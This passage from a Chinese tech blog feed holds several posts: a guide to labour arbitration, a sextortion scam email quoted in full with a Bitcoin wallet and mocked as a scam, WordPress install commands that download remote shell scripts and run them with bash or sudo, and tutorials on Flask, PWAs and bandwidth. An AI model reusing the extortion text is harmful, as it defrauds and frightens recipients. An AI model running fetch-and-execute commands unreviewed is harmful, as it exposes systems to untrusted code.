<p>劳动合同（重要）：这个非常重要，在之后的仲裁或者协商中，这份合同就是最强有力的证据。如果没有签署劳动合同，其他辅助证据也可以。<br>银行流水（重要）：有自助机器打印和去银行营业厅打印，一般拿上身份证和银行卡，然后让柜台直接打印出含有“工资”的银行流水证明，此证明上面是有银行公章，也是能证明你和公司存在劳动关系的强力证明。<br>社保证明（重要）：这个需要自己去社保局机器打印，或者到社保局网站下载打印皆可。<br>打卡记录：如果是指纹打卡，尽量提早去找公司的行政拿到打卡记录，如果是钉钉之类的打卡可以自己下载备份下来。<br>业务证明：一些证明你在公司工作，且和其他公司有往来之类的正式文件，都可以作为证据，谨防公司利用业务漏洞进行诬告，或者以此为筹码拒绝赔偿之类。<br>其他辅助材料可自行搜集，和自己相关的且对自己有利证据的都可以保留。<br>报销发票以及需要报销的相关审批流程或邮件。<br>身份证以及复印件若干。<br>社保卡以及复印件若干。<br>公司营业执照复印件。<br>如果没有营业执照复印件，可以上[国家企业信用信息公示系统]这个网站去搜索公司然后点击打印，也复印若干。</p>
<h1 id="如何进行诉讼"><a href="#如何进行诉讼" class="headerlink" title="如何进行诉讼"></a>如何进行诉讼</h1><p>到了这一步，首先需要克服的是心理，给自己打气，因为通常这个事情有时候会是个持久战，短则几个月，长则一两年。做好万全的准备，不要觉得损失了赔偿金就算了，一些老员工，加上赔偿之后，也是一个不小的数字了，还是一定争取一下。下定决心之后，你有几个事情需要做：</p>
<p>劳动局<br>准备好上面说的材料，带上身份证去劳动局，去了之后先排队登记，需要填写一些表格，如果是很多人一起的话，可以申请集体诉讼，因为那边的优先级大约如下：孕妇（等弱势群体）&gt;集体诉讼&gt;个人诉讼。集体诉讼的话一般是会选几个代表来对接以后的事情，劳动局那边有什么进展都会优先和几个代表沟通。这个时候，劳动局会打电话去公司法人询问，通常这个时候，一些公司就会乖乖的把拖欠工资或者赔偿付款了，因为毕竟公司被劳动局盯上也不是什么好事儿，量大的搞不好还会进经营异常目录之类的，得不偿失。<br>在仲裁材料准备阶段，会涉及到资金的计算，这个时候要注意了，如果是赔偿，需要你把赔偿的金额，以及相关证据一起整理，切记，你提出的要求都是需要有证据支撑的，不能直接是我提多少钱就得赔多少钱。一般资金成分如下：<br>未发的工资：需要劳动合同银行流水等一系列证明。这里有一个细节是关于发薪日，一般是要在合同约定的发薪日之多少天没收到薪资才能算作没发薪水，这个各地规定的不一致，需要自己去查询。例如《深圳工资支付条例》第11条规定：工资支付周期不超过一个月的，约定的工资支付日不得超过支付周期期满后第七日。用人单位因故不能在约定的工资支付日支付工资的，可以延长5日，但最长不得超过15日。<br>赔偿金：需要劳动合同等一系列证明。<br>加班工资：需要相应考勤。<br>报销：需要发票以及需要外出的证据（邮件，审批流程等）<br>整个裁员流程走完了之后，会给你下发一个劳动仲裁书，这个劳动仲裁书里面会详细写明了需要公司在xx时间给你打款或者赔偿xx金额。这个就是你的讨薪或者获取赔偿最重要的材料。<br>如果你对这个仲裁书的内容不服，接下来的步骤就是直接去法院诉讼。<br>如果公司在仲裁书的期限内没有给你打款，那么接下来的步骤也是直接去法院诉讼。法院诉讼也不需要担心，一般这种情况是不可能败诉的。<br>有些地区是有援助律师，可以找一下当地的人力资源和社会保障的网站，会有一些法律援助，如果有自己不了解相关法律法规的，可以直接过去询问。<br>最后一步是去法院，如果公司涉及到违法行为，如之前的一些p2p公司，这个时候就需要公安和法院介入，这个话题就会更复杂一些，流程也会更多一些。这里就先不详细展开这一部分。当然去了法院也有可能是一个更加漫长的过程，公司可能会使用到一些常规法律手段拖，比如公司所在地，或者不服多次开庭等手段。<br>这篇文章到此为止，冬天确实很冷，但是资本家的心比-273.15度更低。拿起法律武器保护自己的合法权益是必须的，希望大家2020过得越来越好，新年快乐，希望大家永远也用不到这篇文章。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/12/coding-2/">如何杜绝一句话需求？程序员如何将不合理的需求合理的怼回去？</a></li><li><a href="https://thelighter.github.io/2020/02/12/program-rank/">2019 program language rank,2019年编程语言排名</a></li></ul></div>]]></content>
      <categories>
        <category>编程生涯</category>
      </categories>
      <tags>
        <tag>编程生涯</tag>
      </tags>
  </entry>
  <entry>
    <title>来自于暗网搞笑的撒网式诈骗邮件</title>
    <url>/2020/01/05/darkweb-1/</url>
    <content><![CDATA[<p>一份暗网勒索比特币的邮件<br><a id="more"></a></p>
<p>Hello!</p>
<p>I have very bad news for you. 02/09/2019 - on this day I hacked your OS and got full access to your account email. Your password is indicated in subject of this email.</p>
<p>So, you can change the password, yes.. But my malware intercepts it every time.</p>
<p>How I made it: In the software of the router, through which you went online, was a vulnerability. I just hacked this router and placed my malicious code on it. When you went online, my trojan was installed on the OS of your device.</p>
<p>After that, I made a full dump of your disk (I have all your address book, history of viewing sites, all files, phone numbers and addresses of all your contacts).</p>
<p>A month ago, I wanted to lock your device and ask for a not big amount of btc to unlock. But I looked at the sites that you regularly visit, and I was shocked by what I saw!!! I’m talk you about sites for adults.</p>
<p>I want to say - you are a BIG pervert. Your fantasy is shifted far away from the normal course!</p>
<p>And I got an idea…. I made a screenshot of the adult sites where you have fun (do you understand what it is about, huh?). After that, I made a screenshot of your joys (using the camera of your device) and glued them together. Turned out amazing! You are so spectacular!</p>
<p>I’m know that you would not like to show these screenshots to your friends, relatives or colleagues. I think $874 is a very, very small amount for my silence. Besides, I have been spying on you for so long, having spent a lot of time!</p>
<p>Pay ONLY in Bitcoins! My BTC wallet: 1LJNYEhpg7KzgqRewTsRtjiHRLQP2epgfD</p>
<p>You do not know how to use bitcoins? Enter a query in any search engine: “how to replenish btc wallet”. It’s extremely easy</p>
<p>For this payment I give you two days (48 hours). As soon as this letter is opened, the timer will work.</p>
<p>After payment, my virus and dirty screenshots with your enjoys will be self-destruct automatically. If I do not receive from you the specified amount, then your device will be locked, and all your contacts will receive a screenshots with your “enjoys”.</p>
<p>I hope you understand your situation.</p>
<p>Do not try to find and destroy my virus! (All your data, files and screenshots is already uploaded to a remote server)<br>Do not try to contact me (this is not possible, the sender is randomized automatically)<br>Various security services will not help you; formatting a disk or destroying a device will not help, since your data is already on a remote server.<br>P.S. You are not my single victim. so, I guarantee you that I will not disturb you again after payment! This is the word of honor hacker.</p>
<p>I also ask you to regularly update your antiviruses in the future. This way you will no longer fall into a similar situation.</p>
<p>Do not hold evil! I just do my job. Good luck.</p>
<p>翻译如下</p>
<p>你好！</p>
<p>我对你有个坏消息。2019年2月9日-在这一天，我黑客入侵了您的操作系统，并完全访问了您的帐户电子邮件。您的密码显示在此电子邮件的主题中。</p>
<p>因此，您可以更改密码，可以。但是我的恶意软件每次都会截获它。</p>
<p>我是怎么做到的：在您上网的路由器软件中，是一个漏洞。我只是入侵了此路由器，并在其上放置了恶意代码。当您上网时，我的木马程序已安装在设备的操作系统上。</p>
<p>之后，我对您的磁盘进行了完全转储（我拥有您的所有通讯录，查看站点的历史记录，所有文件，电话号码和所有联系人的地址）。</p>
<p>一个月前，我想锁定您的设备，并要求解锁大量的btc。但是我看了您经常访问的站点，我被看到的消息震惊了！！！我说的是成人网站。</p>
<p>我想说-您是个大变态。您的幻想已偏离正常路线！</p>
<p>我有个主意…。我在成人网站上做了一个屏幕截图，您在其中玩乐（您了解它的含义，对吗？）。之后，我用您的设备的摄像头对您的快乐进行了截图，并将它们粘合在一起。原来是惊人的！你真壮观！</p>
<p>我知道您不希望将这些屏幕截图显示给您的朋友，亲戚或同事。我认为，874美元对于我的沉默来说是非常非常小的金额。此外，我花了很多时间监视你很久了！</p>
<p>只用比特币付款！我的BTC钱包：1LJNYEhpg7KzgqRewTsRtjiHRLQP2epgfD</p>
<p>您不知道如何使用比特币？在任何搜索引擎中输入查询：“如何补充btc钱包”。非常容易</p>
<p>对于这笔付款，我给您两天（48小时）。打开这封信后，计时器就会工作。</p>
<p>付款后，您喜欢的病毒和肮脏的屏幕截图会自动销毁。如果我没有收到您指定的金额，那么您的设备将被锁定，并且所有联系人都会收到带有“享受”的屏幕截图。</p>
<p>希望您了解您的情况。</p>
<p>不要试图寻找并销毁我的病毒！（您的所有数据，文件和屏幕截图已上传到远程服务器）<br>不要尝试与我联系（这是不可能的，发件人会自动随机分组）<br>各种安全服务不会帮助您；格式化磁盘或销毁设备将无济于事，因为您的数据已在远程服务器上。<br>PS您不是我的唯一受害者。因此，我向您保证，付款后我不会再打扰您！这是荣誉黑客的话。</p>
<p>我还要求您以后定期更新防病毒软件。这样，您将不再陷入类似的情况。</p>
<p>不要邪恶！我只是做我的工作。祝好运。</p>
]]></content>
      <categories>
        <category>暗网</category>
      </categories>
      <tags>
        <tag>暗网</tag>
      </tags>
  </entry>
  <entry>
    <title>4岁萝莉给Linux内核贡献提交</title>
    <url>/2020/01/05/linux-1/</url>
    <content><![CDATA[<p>4岁外国女孩竟然参与到Linux项目中去<br><a id="more"></a></p>
<p>原文链接<br><a href="https://www.reddit.com/r/linux/comments/2pqqla/kernel_commit_4_year_old_girl_fixes_formatting_to/cmzfvpl/" target="_blank" rel="noopener">https://www.reddit.com/r/linux/comments/2pqqla/kernel_commit_4_year_old_girl_fixes_formatting_to/cmzfvpl/</a></p>
<h1 id="她修改了什么"><a href="#她修改了什么" class="headerlink" title="她修改了什么"></a>她修改了什么</h1><p><img src="https://img03.sogoucdn.com/app/a/100520146/a06ef7292733ce4aefd018df88a38d7f" alt="34358-20200101131558737-764060224.png"></p>
<p>只是给s下面加了一条横线，让s看起来不是很孤单，真的很可爱的想法，同时可以看出外国的世界真的很宽容，充满了爱和希望</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>渐进式web应用（PWA）—— PWA应用到底好在哪里？</title>
    <url>/2019/12/22/pwa/</url>
    <content><![CDATA[<p>PWA应用是指虽然是web应用，但是同时赋予它们原生应用的特性。<br>例如，web应用更加易于发现——相比于安装应用，访问一个网站显然更加容易和迅速，并且你可以通过一个链接来分享web应用。<br>在另一方面，原生应用与操作系统可以更加完美的整合，也因此为用户提供了无缝的用户体验。你可以通过安装应用使得它在离线的状态下也可以运行，并且相较于使用浏览器访问，用户也更喜欢通过点击主页上的图标来访问它们喜爱的应用。<br><a id="more"></a></p>
<p>正如前文所述，PWA不是使用一种技术创建的。它们代表了构建Web应用程序的新理念，涉及一些特定的模式，API和其他功能。如果一个Web App从一开始就是PWA，那就不那么明显了。当应用程序满足某些要求时，可以将其视为PWA，或者实现一组给定的功能：离线工作，可安装，易于同步，可以发送推送通知等。</p>
<p>此外，还有一些工具可以按百分比衡量应用的完整性。（Lighthouse目前是最受欢迎的工具）通过实施各种技术优势，我们可以使应用程序更加渐进式，从而最终获得更高的Lighthouse 得分。但这只是一个粗略的指标。</p>
<p>这里有一些关键的原则来辨别一个web应用是否是一个PWA应用。它应该具有以下特点:</p>
<p>Discoverable, 内容可以通过搜索引擎发现。<br>Installable, 可以出现在设备的主屏幕。<br>Linkable, 你可以简单地通过一个URL来分享它。<br>Network independent, 它可以在离线状态或者是在网速很差的情况下运行。<br>Progressive, 它在老版本的浏览器仍旧可以使用，在新版本的浏览器上可以使用全部功能。<br>Re-engageable, 无论何时有新的内容它都可以发送通知。<br>Responsive, 它在任何具有屏幕和浏览器的设备上可以正常使用——包括手机，平板电脑，笔记本，电视，冰箱，等。<br>Safe, 在你和应用之间的连接是安全的，可以阻止第三方访问你的敏感数据。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
  </entry>
  <entry>
    <title>wordpress一键安装脚本，超级简单</title>
    <url>/2019/10/30/wordpress/</url>
    <content><![CDATA[<p>一键安装wordpress脚本<br><a id="more"></a></p>
<h1 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget https://raw.githubusercontent.com/atrandys/wordpress/master/wp_install.sh &amp;&amp; chmod +x wp_install.sh &amp;&amp; ./wp_install.sh</span><br></pre></td></tr></table></figure>
<h1 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h1><p><a href="https://easyengine.io/" target="_blank" rel="noopener">https://easyengine.io/</a></p>
<h2 id="Install-EasyEngine-on-Linux"><a href="#Install-EasyEngine-on-Linux" class="headerlink" title="Install EasyEngine on Linux"></a>Install EasyEngine on Linux</h2><p>wget -qO ee rt.cx/ee4 &amp;&amp; sudo bash ee</p>
<h2 id="Install-EasyEngine-on-Mac"><a href="#Install-EasyEngine-on-Mac" class="headerlink" title="Install EasyEngine on Mac"></a>Install EasyEngine on Mac</h2><p>brew install easyengine</p>
<h2 id="Create-a-site-at-example-com-with-WordPress"><a href="#Create-a-site-at-example-com-with-WordPress" class="headerlink" title="Create a site at example.com with WordPress"></a>Create a site at example.com with WordPress</h2><p>sudo ee site create example.com –type=wp</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>wordpress</category>
      </categories>
      <tags>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>在flask中如何自定义自己的扩展包并上传到官网</title>
    <url>/2019/10/06/flask-1-1/</url>
    <content><![CDATA[<p>在flask中构建自己的模块<br><a id="more"></a><br>创建工程<br>让我们先创建一个工程，目录结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flask-logging/</span><br><span class="line">  ├ LICENSE           # 授权说明</span><br><span class="line">  ├ README            # 项目介绍</span><br><span class="line">  ├ setup.py          # 打包分发文件</span><br><span class="line">  └ flask_logging/    # 扩展代码包</span><br><span class="line">      └ __init__.py   # 扩展代码</span><br></pre></td></tr></table></figure></p>
<p>根据Flask扩展命名规范，扩展名必须为”Flask-Logging”形式，以”Flask-“为前缀，后面的单词首字母大写。扩展的代码必须放在名为”flask_logging”的包下，注意这里是下划线，与扩展名中的横线不同，单词都小写。”LICENSE”和”README”文件都是审核必须的，关于审核部分，我们会在后面介绍。</p>
<p>编写分发文件<br>接下来，我们写”setup.py”文件，示例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flask-Logging</span><br><span class="line">-------------</span><br><span class="line">Log every request to specific view</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">from setuptools import setup</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=&apos;Flask-Logging&apos;,</span><br><span class="line">    version=&apos;1.0&apos;,</span><br><span class="line">    url=&apos;http://example.com/flask-logging/&apos;,</span><br><span class="line">    license=&apos;BSD&apos;,</span><br><span class="line">    author=&apos;Billy J. Hee&apos;,</span><br><span class="line">    author_email=&apos;billy@bjhee.com&apos;,</span><br><span class="line">    description=&apos;Log every request to specific view&apos;,</span><br><span class="line">    long_description=__doc__,</span><br><span class="line">    packages=[&apos;flask_logging&apos;],</span><br><span class="line">    zip_safe=False,</span><br><span class="line">    include_package_data=True,</span><br><span class="line">    platforms=&apos;any&apos;,</span><br><span class="line">    install_requires=[</span><br><span class="line">        &apos;Flask&apos;</span><br><span class="line">    ],</span><br><span class="line">    classifiers=[</span><br><span class="line">        &apos;Environment :: Web Environment&apos;,</span><br><span class="line">        &apos;Intended Audience :: Developers&apos;,</span><br><span class="line">        &apos;License :: OSI Approved :: BSD License&apos;,</span><br><span class="line">        &apos;Operating System :: OS Independent&apos;,</span><br><span class="line">        &apos;Programming Language :: Python&apos;,</span><br><span class="line">        &apos;Topic :: Internet :: WWW/HTTP :: Dynamic Content&apos;,</span><br><span class="line">        &apos;Topic :: Software Development :: Libraries :: Python Modules&apos;</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这里需要注意几点：</p>
<p>扩展名的格式必须为”Flask-Logging”，上节介绍过<br>必须指定url链接到扩展主页或文档<br>“zip_safe”必须为False<br>“install_requires”必须列出所有依赖的库<br>编写扩展代码<br>进入主题了，由于我们的扩展相当简单，因此所有代码都放在了<strong>init</strong>.py中：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">from flask import current_app, request</span><br><span class="line">from functools import wraps</span><br><span class="line">from logging.handlers import TimedRotatingFileHandler</span><br><span class="line">import logging</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 指定日志文件名，日志级别，及日志记录格式</span><br><span class="line">entry_log = TimedRotatingFileHandler(&apos;entry.log&apos;,&apos;D&apos;)</span><br><span class="line">entry_log.setLevel(logging.DEBUG)</span><br><span class="line">entry_log.setFormatter(logging.Formatter(&apos;%(asctime)s %(levelname)s: %(message)s&apos;))</span><br><span class="line"></span><br><span class="line">class Logging:</span><br><span class="line">    # 构造函数</span><br><span class="line">    def __init__(self, app=None):</span><br><span class="line">        self.app = app</span><br><span class="line">        if app is not None:</span><br><span class="line">            self.init_app(app)</span><br><span class="line"></span><br><span class="line">    # 初始化应用</span><br><span class="line">    def init_app(self, app):</span><br><span class="line">        app.logger.addHandler(entry_log)</span><br><span class="line"></span><br><span class="line">    # 视图装饰器，被装饰的视图将自动记录访问日志</span><br><span class="line">    def log_entry(self, func):</span><br><span class="line">        app = self.app or current_app</span><br><span class="line">        @wraps(func)</span><br><span class="line">        def decorator(*args, **kwargs):</span><br><span class="line">            start = time.time()</span><br><span class="line">            # 记录请求开始</span><br><span class="line">            app.logger.debug(&apos;Start request call: %s&apos; % request.url)</span><br><span class="line">            ret = func(*args, **kwargs)</span><br><span class="line">            # 记录请求结束</span><br><span class="line">            app.logger.debug(&apos;Finish request call: %s&apos; % request.url)</span><br><span class="line">            duration = time.time() - start</span><br><span class="line">            # 记录请求所耗时长</span><br><span class="line">            app.logger.debug(&apos;Request: %s consumed %f s&apos; % (request.url, duration))</span><br><span class="line">            return ret</span><br><span class="line"></span><br><span class="line">        return decorator</span><br></pre></td></tr></table></figure></p>
<p>代码逻辑都在写注释里了，这个扩展提供了log_entry视图装饰器，来记录视图访问日志。这里同样要注意几个重要的部分：</p>
<p>构造函数<strong>init</strong>()和初始化函数init_app()是必须的<br>如果构造函数传入了app，则调用init_app()，这样确保两者功能一致<br>构造函数里我们设置了self.app=app，而init_app()没有，这是为什么呢？这是一种规范，或者说习惯。当系统只有一个app时，建议使用构造函数初始化扩展对象，这时对象中的app就指向这一个应用。而当系统有多个应用同时存在，比如说应用工厂或测试场景下，建议使用init_app()来初始化扩展对象，这样扩展对象不会指向任何应用<br>在视图装饰器里，我们使用了app = self.app or current_app来获取当前应用，这分别对应于上一点说的单个应用及多个应用场景<br>因为视图装饰器是视图访问时被调用，所以此时应用上下文和请求上下文都存在，因此我们可以访问到current_app和request对象。离开上下文的话，就无效了<br>扩展写完了，让我们来测试一下，创建一个Flask应用：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask_logging import Logging</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">logging = Logging(app)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">@logging.log_entry</span><br><span class="line">def index():</span><br><span class="line">    return &apos;&lt;h1&gt;Hello World&lt;/h1&gt;&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;, debug=True)</span><br></pre></td></tr></table></figure></p>
<p>启动应用，访问<a href="http://localhost:5000/。查看下代码当前路径，是不是出现了”entry.log”文件，并且记录了URL请求日志？" target="_blank" rel="noopener">http://localhost:5000/。查看下代码当前路径，是不是出现了”entry.log”文件，并且记录了URL请求日志？</a></p>
<p>关于审核<br>个人没有发起过审核申请，对于具体流程尚不清楚。不过如果你要将自己的扩展提交官方审核，至少要做到下面几点：</p>
<p>扩展代码在包flask_myext下，审核通过后，Flask会设置一个重定向包flask.ext.myext来指向你的包。对于用户来说，官方扩展建议导入flask.ext.myext格式的包<br>必须提供一个”setup.py”分发文件，并在PyPI上注册，这样用户就可以通过pip install来安装你的扩展<br>必须提供”LICENSE”文件，并且授权是BSD, MIT或WTFPL<br>必须提供”README”文件及文档，文档是由Sphinx生成<br>必须同时提交单元测试代码<br>必须支持Python 2.6和2.7版本</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/29/flask-5/">python flask 数据库乐观锁</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>苹果应用上架指南</title>
    <url>/2019/07/22/apple-app/</url>
    <content><![CDATA[<p>快速上架你的苹果ios应用<br><a id="more"></a></p>
<h1 id="上架基本需求资料"><a href="#上架基本需求资料" class="headerlink" title="上架基本需求资料"></a>上架基本需求资料</h1><p>1、苹果开发者账号（如还没账号先申请-苹果开发者账号申请教程）2、开发好的APP</p>
<h1 id="首先测试APP，如没问题再上传APP审核！"><a href="#首先测试APP，如没问题再上传APP审核！" class="headerlink" title="首先测试APP，如没问题再上传APP审核！"></a>首先测试APP，如没问题再上传APP审核！</h1><p>A部分：真机调试分5步进行介绍，如果已经真机测试好，请直接下拉看B步骤。（上架前一定要先测试好APP，要不app一堆bug，上架也审核不过，浪费时间）1、安装iOS上架辅助软件Appuploader2、登录Appuploader申请iOS开发证书文件p123、登录Appuploader申请iOS开发证书描述文件mobileprovision4、使用iOS证书文件打包苹果APP5、安装打包的APP到苹果手机测试</p>
<h1 id="申请证书"><a href="#申请证书" class="headerlink" title="申请证书"></a>申请证书</h1><p>B部分：上架App Store审核分6步进行。1、申请iOS发布证书2、申请iOS发布描述文件3、打包ipa4、iTunes Connect创建APP5、上传ipa6、设置APP各项信息提交审核</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>苹果应用</category>
      </categories>
      <tags>
        <tag>苹果</tag>
      </tags>
  </entry>
  <entry>
    <title>利用js生成并下载文件</title>
    <url>/2019/07/14/js-download/</url>
    <content><![CDATA[<p>使用js生成文件并下载<br><a id="more"></a></p>
<h1 id="新建一个下载function"><a href="#新建一个下载function" class="headerlink" title="新建一个下载function"></a>新建一个下载function</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">filename, text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> element = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  element.setAttribute(<span class="string">'href'</span>, <span class="string">'data:text/plain;charset=utf-8,'</span> + <span class="built_in">encodeURIComponent</span>(text));</span><br><span class="line">  element.setAttribute(<span class="string">'download'</span>, filename);</span><br><span class="line"></span><br><span class="line">  element.style.display = <span class="string">'none'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(element);</span><br><span class="line"></span><br><span class="line">  element.click();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用download(“hello.txt”,”This is the content of my file :)”);即可</p>
<p>下载属性指定当用户单击超链接时将下载目标。只有在设置href属性时才使用此属性。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 3.7.4 发布,到底有什么新变化，python 3.7.4意味着什么？</title>
    <url>/2019/07/13/Python-1/</url>
    <content><![CDATA[<p>Python 3.7.4 发布,到底有什么新变化，python 3.7.4意味着什么？<br><a id="more"></a></p>
<h1 id="Python-3-7-4-发布"><a href="#Python-3-7-4-发布" class="headerlink" title="Python 3.7.4 发布"></a>Python 3.7.4 发布</h1><p>详细内容地址  <a href="https://www.python.org/downloads/release/python-374/" target="_blank" rel="noopener">python3.7.4</a></p>
<p>3.7.4 主要变化如下<br>面向 Windows 用户<br>OpenSSL 已从 1.1.0 升级至 1.1.1，SQLite 也已升级至 3.28.0<br>面向 AMD64 设备的二进制文件也适用于实现了 Intel 64 架构的处理器。(也被称为”x64”架构，曾被称为”EM64T”和”x86-64”)<br>现已面向 Windows 平台提供基于 Web 的安装程序，安装程序会在安装时下载所需的组件<br>……<br>面向 macOS 用户<br>OpenSSL 已从 1.1.0 升级至 1.1.1，SQLite 也已升级至 3.28.0<br>对于 Python 3.7.4，官方提供了两个二进制安装包供选择下载。默认变体仅提供 64 位版本，并运行在 macOS 10.9 及更高的版本上<br>两个 python.org 安装程序变体均包含私有的 OpenSSL 副本。请仔细阅读安装期间显示的重要信息，以获取有关 SSL/TLS 证书认证和 Install Certificates.command 的信息</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>



]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python最新版本</tag>
      </tags>
  </entry>
  <entry>
    <title>带宽流量和cdn概念以及计算方法</title>
    <url>/2019/07/13/cdn/</url>
    <content><![CDATA[<p>带宽流量和cdn概念以及计算方法<br><a id="more"></a></p>
<h1 id="带宽的概念和计算方法"><a href="#带宽的概念和计算方法" class="headerlink" title="带宽的概念和计算方法"></a>带宽的概念和计算方法</h1><p>在网络中的带宽往往是指一个固定的时间内，能通过的最大位数据，即数据传输率。带宽是一个计量单位，用来计量单位时间内传输的数据量的多少。</p>
<p>这个数据量的单位是比特每秒(bps)、千比特每秒(Kbps)、兆比特每秒(Mbps)<br>1Byte=8bits（1字节为8比特）因此：<br>1Byte/sec=8bps,1024kbps=128KB/s,1024Mbps=128MB/s<br>在这里要注意的是传输单位的写法上，B和b分别代表Byte和bit，两者的定义是不同的，千万不要混淆。</p>
<h2 id="带宽的上行与下行："><a href="#带宽的上行与下行：" class="headerlink" title="带宽的上行与下行："></a>带宽的上行与下行：</h2><p>上行带宽就是从电脑上传的速度，下行带宽就是从网络上的主机下载速度，一般下行速率比较高！<br>上行流量就是本机向inter网发送的字节数，下行流量就是从网络中下载的字节数。</p>
<h1 id="流量的概念和计算方法"><a href="#流量的概念和计算方法" class="headerlink" title="流量的概念和计算方法"></a>流量的概念和计算方法</h1><p>在生活中，我们手机用的流量就是这个流量的意思，是我们使用数据的总量，当然包括你的上传和下载<br>以前我们是 5元1GB，现在我们的流量比较便宜了 大多是无限流量，但是也会被限速<br>下面我们说家庭的带宽和服务器的流量<br>5Mb 带宽，假如一个月全部跑满，那跑出的数据流量大约是 1.5TB。<br>1Mbps=1M bit/s=128KB/s=11059200KB/d=10GB/day=300GB/mon<br>5Mbps=1500GB/mon=1.5TB/mon</p>
<p>5Mb的带宽最多是1.5TB<br>服务器如果人用的多的话就会访问失败，因为超过了最大的流量带宽</p>
<h1 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h1><p>cdn的出现就是为了加速对于某些资源的访问速度，当然按照流量和访问次数收费</p>
<p>首先要说的是应用服务器和资源服务器应该解耦，也就是应用服务器只处理逻辑，而资源服务器存放内容或者叫资源。术业有专攻，如果混在一起，会拖慢应用服务器的速度，如果没有CDN来专门处理资源，那所有的资源部署可能会离用户很远，保证不了体验，专业的CDN服务商专注于这里，并且规模也让成本不断下降，就像许多公司周边产品都是外包出去，自己也可以做，只不过专门生产礼品的公司会更有效率、更专业、价格也更低、不耗费自己公司的人力资源。</p>
<p>假设你在创业，那如果你只租用了一台服务器，并把资源也放在这个服务器上，那和把资源放在CDN上对于全国用户的体验会差很远，假设服务器在北京，那广东的用户要走更长的路，而且还处理不了跨运营商访问等等一系列问题。</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
